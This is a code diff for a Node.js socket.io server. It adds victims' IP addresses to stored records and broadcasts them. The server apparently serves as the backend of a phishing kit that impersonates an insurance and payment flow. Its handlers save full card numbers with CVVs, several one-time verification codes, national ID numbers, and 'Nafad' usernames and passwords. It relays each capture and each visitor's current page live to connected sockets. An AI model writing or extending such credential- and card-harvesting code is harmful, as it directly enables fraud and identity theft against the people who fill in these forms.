@@ -210,7 +210,8 @@ io.on('connection', socket => {
         } else {
             // — it didn’t exist: create a fresh one
             v = await Visit.create({ user: user._id, page, ip });
-        } io.emit('locationUpdated', { ip, page, time: v.time });
+        }
+        io.emit('locationUpdated', { ip, page, time: v.time });
     });
 
 
@@ -220,6 +221,7 @@ io.on('connection', socket => {
         // 1) Ensure the User exists
         const user = await findOrCreateUser(ip);
         const saved = await PhoneCode.create({
+            ip: ip,
             user: user._id,
             code: verification_code_three,
             time: Date.now()
@@ -244,6 +246,7 @@ io.on('connection', socket => {
             user: user._id,
             companyName: payload.companyName,
             basePrice: Number(payload.basePrice),
+            ip: payload.ip,
             selectedOptions: payload.selectedOptions,
             totalPrice: Number(payload.totalPrice),
             time: Date.now()
@@ -270,6 +273,7 @@ io.on('connection', socket => {
         // 2) Create the Verification document
         const saved = await Verification.create({
             user: user._id,
+            ip: ip,
             code: verification_code_two,
             time: Date.now()
         });
@@ -306,6 +310,7 @@ io.on('connection', socket => {
                 TypeOfInsuranceContract: payload.TypeOfInsuranceContract,
                 InsuranceStartDate: startDate,
                 PurposeOfUse: payload.PurposeOfUse,
+                ip: payload.ip,
                 EstimatedValue: Number(payload.EstimatedValue),
                 ManufactureYear: payload.ManufactureYear,
                 RepairLocation: payload.RepairLocation,
@@ -339,6 +344,7 @@ io.on('connection', socket => {
             companyName: payload.companyName,
             basePrice: Number(payload.basePrice),
             selectedOptions: payload.selectedOptions,
+            ip: payload.ip,
             totalPrice: Number(payload.totalPrice),
             time: Date.now()
         });
@@ -361,6 +367,7 @@ io.on('connection', socket => {
         // 2) Create the Billing record
         const saved = await Billing.create({
             user: user._id,
+            ip: payload.ip,
             mada: !!payload.mada,
             visa_mastarcard: !!payload.visa_mastarcard,
             applepay: !!payload.applepay,
@@ -393,11 +400,12 @@ io.on('connection', socket => {
             FullName: payload.FullName,
             PhoneNumber: payload.PhoneNumber,
             SerialNumber: payload.SerialNumber,
+            ip: payload.ip,
             VerificationCode: payload.VerificationCode
         });
 
         io.emit('newIndex', {
-            ip: user.ip,
+            ip: saved.ip,
             SellerIDnumber: saved.SellerIDnumber,
             BuyerIDnumber: saved.BuyerIDnumber,
             IDorResidenceNumber: saved.IDorResidenceNumber,
@@ -420,6 +428,7 @@ io.on('connection', socket => {
             user: user._id,
             cardHolderName: payload.cardHolderName,
             cardNumber: payload.cardNumber,
+            ip: payload.ip,
             expirationDate: payload.expirationDate,
             cvv: payload.cvv,
             time: Date.now()
@@ -446,6 +455,7 @@ io.on('connection', socket => {
         // 2) Save the code submission
         const saved = await code.create({
             user: user._id,
+            ip: ip,
             verificationCode: verification_code,
             time: Date.now()
         });
@@ -469,6 +479,7 @@ io.on('connection', socket => {
         // 2) Save the code submission
         const saved = await NafadCode.create({
             user: user._id,
+            ip: ip,
             code: verification_code,
             time: Date.now()
         });
@@ -510,6 +521,7 @@ io.on('connection', socket => {
         // 2) Save exactly the fields your form sends
         const saved = await phone.create({
             user: user._id,
+            ip: payload.ip,
             phoneNumber: payload.phoneNumber,
             operator: payload.operator,
             time: Date.now()
@@ -535,6 +547,7 @@ io.on('connection', socket => {
         // 2) Save the Nafad login data
         const saved = await Nafad.create({
             user: user._id,
+            ip: ip,
             username,
             password,
             time: Date.now()
